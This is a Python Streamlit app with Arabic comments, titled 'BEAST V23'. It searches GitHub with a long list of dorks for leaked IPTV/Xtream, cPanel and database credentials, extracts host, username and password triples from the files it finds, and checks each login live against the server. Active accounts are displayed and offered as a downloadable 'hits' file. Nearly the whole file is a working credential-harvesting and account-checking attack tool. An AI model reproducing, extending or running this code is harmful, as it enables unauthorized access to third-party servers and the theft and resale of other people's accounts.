import streamlit as st
import requests
import re
import time
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

st.set_page_config(page_title="BEAST V23 - ULTRA SCANNER", layout="wide")

# --- نظام الدخول ---
if "auth" not in st.session_state:
    st.session_state.auth = False

if not st.session_state.auth:
    st.markdown("<h1 style='text-align: center; color:#00ff41;'>🌪️ BEAST V23 - ULTRA SPEED</h1>", unsafe_allow_html=True)
    pwd = st.text_input("Password:", type="password")
    if st.button("دخول"):
        if pwd == "BEAST_V17_PRO":
            st.session_state.auth = True
            st.rerun()
    st.stop()

# --- التنسيق البصري ---
st.markdown("""
<style>
    .stApp { background-color: #060606; }
    .scan-log { color: #00d4ff; font-family: monospace; font-size: 12px; margin: 0; }
    .active-hit {
        background: linear-gradient(90deg, #0d1117, #001a00); 
        border-left: 5px solid #00ff41;
        padding: 15px; border-radius: 8px; margin-bottom: 10px;
        box-shadow: 0 4px 15px rgba(0, 255, 65, 0.1);
    }
    .text-green { color: #00ff41; font-weight: bold; font-size: 1.1em; }
    .text-yellow { color: #fbbf24; }
    .text-white { color: #e5e7eb; font-family: 'Courier New', monospace; }
    .stButton>button { width: 100%; background: #00ff41; color: black; font-weight: bold; }
</style>
""", unsafe_allow_html=True)

with st.sidebar:
    st.title("⚡ BEAST V23 ULTRA")
    token = st.text_input("GitHub Token:", type="password", help="ضع توكن جيت هاب هنا لتجنب الحظر")
    max_workers = st.slider("سرعة الخيوط (Threads)", 10, 100, 40)
    timeout_val = st.slider("مهلة الرد (Timeout)", 1, 10, 3)
    start = st.button("🚀 إطلاق الهجوم الشامل")
    st.warning("ملاحظة: جيت هاب تسمح بحد أقصى 1000 نتيجة لكل بحث.")

st.subheader("📡 رادار البحث المباشر")
radar_area = st.empty()

st.subheader("🏆 النتائج المكتشفة (HITS)")
hits_area = st.container()

# --- دالة الفحص الذكي ---
def check_server(session, host, user, pw, timeout):
    try:
        check_url = f"{host}/player_api.php?username={user}&password={pw}"
        r = session.get(check_url, timeout=timeout)
        data = r.json()
        if data.get("user_info", {}).get("status") == "Active":
            exp_date = data.get("user_info", {}).get("exp_date")
            if exp_date:
                dt = datetime.fromtimestamp(int(exp_date)).strftime('%Y-%m-%d')
            else:
                dt = "Unlimited"
            return {"status": "Active", "exp": dt}
    except:
        pass
    return None

if start and token:
    session = requests.Session()
    session.headers.update({'Authorization': f'token {token}', 'Accept': 'application/vnd.github.v3+json'})

    # --- قائمة دروكس موسعة جداً (IPTV / Xtream / Portals) ---
    dorks = [
        'extension:txt "get.php?username=" "password="',
        'extension:m3u "player_api.php"',
        'extension:php "username" "password" "server" "port"',
        'extension:json "server" "username" "password"',
        'extension:cfg "xtream" "user" "pass"',
        'extension:conf "enigma2" "http" "user"',
        'extension:txt "http://" "user" "pass" "panel"',
        'path:.env "XTREAM"',
        'extension:sql "INSERT INTO users" "password"',
        'extension:txt "cpanel" "host" "user" "pass"',
        'extension:ini "portal" "username"',
        'extension:txt "http://" "8080" "username" "password"',
        'extension:txt "http://" "25461" "username" "password"',
        '"player_api.php?username=" extension:php',
        'extension:m3u "http://" "user=" "pass="',
        'extension:txt "dns" "port" "username" "password"',
        'filename:settings.xml "xtream-codes"',
        'extension:log "login" "password" "iptv"',
        'extension:txt "panel_api.php?username="',
        'extension:py "xtream" "username" "password"',
        'extension:sh "http://" "user" "pass"',
        'extension:txt "http://" "2086" "username" "password"',
        'extension:txt "http://" "2095" "username" "password"',
        'extension:txt "http://" "8000" "username" "password"',
        'extension:txt "/live/" "username" "password"',
    ]

    found_count = 0
    hits_list = []

    for dork in dorks:
        page = 1
        max_pages = 10 # جيت هاب لا تعطي أكثر من 1000 نتيجة (10 صفحات × 100)
        
        while page <= max_pages:
            try:
                search_url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=100"
                res = session.get(search_url).json()

                if "items" not in res:
                    radar_area.warning(f"⚠️ Rate limit! ننتظر 20 ثانية لتجنب الحظر...")
                    time.sleep(20)
                    continue

                items = res.get("items", [])
                if not items: break

                radar_area.info(f"🔎 Dork: {dork[:30]}.. | الصفحة: {page} | الملفات: {len(items)}")

                # استخراج الروابط الخام دفعة واحدة
                raw_urls = [item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/') for item in items]

                def process_file(url):
                    try:
                        content = requests.get(url, timeout=5).text
                        # Regex مطور لجلب كل الصيغ الممكنة للروابط واليوزرات
                        pattern = r"(https?://[a-zA-Z0-9\.-]+:\d+)/[a-zA-Z\._-]+\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)"
                        return re.findall(pattern, content)
                    except: return []

                # فحص الملفات بالتوازي
                with ThreadPoolExecutor(max_workers=max_workers) as executor:
                    futures = {executor.submit(process_file, url): url for url in raw_urls}
                    for future in as_completed(futures):
                        results = future.result()
                        for host, user, pw in results:
                            # فحص السيرفر فوراً إذا كان شغال
                            check = check_server(session, host, user, pw, timeout_val)
                            if check:
                                found_count += 1
                                hit_text = f"""
                                <div class="active-hit">
                                    <span class="text-green">✅ HIT #{found_count} - ACTIVE</span><br>
                                    <span class="text-white"><b>HOST:</b> {host}</span><br>
                                    <span class="text-yellow"><b>USER:</b> {user} | <b>PASS:</b> {pw}</span><br>
                                    <span class="text-white" style="font-size:0.8em;">📅 EXPIRY: {check['exp']}</span>
                                </div>
                                """
                                with hits_area:
                                    st.markdown(hit_text, unsafe_allow_html=True)
                                hits_list.append(f"{host}|{user}|{pw}|EXP:{check['exp']}")

                page += 1
                time.sleep(1) # تأخير بسيط لتجنب حظر IP

            except Exception as e:
                radar_area.error(f"Error: {str(e)}")
                time.sleep(5)

    st.success(f"🏁 انتهى البحث العظيم! تم العثور على {found_count} حساب شغال.")
    if hits_list:
        st.download_button("📥 تحميل ملف الهيتات", "\n".join(hits_list), "beast_ultra_hits.txt")
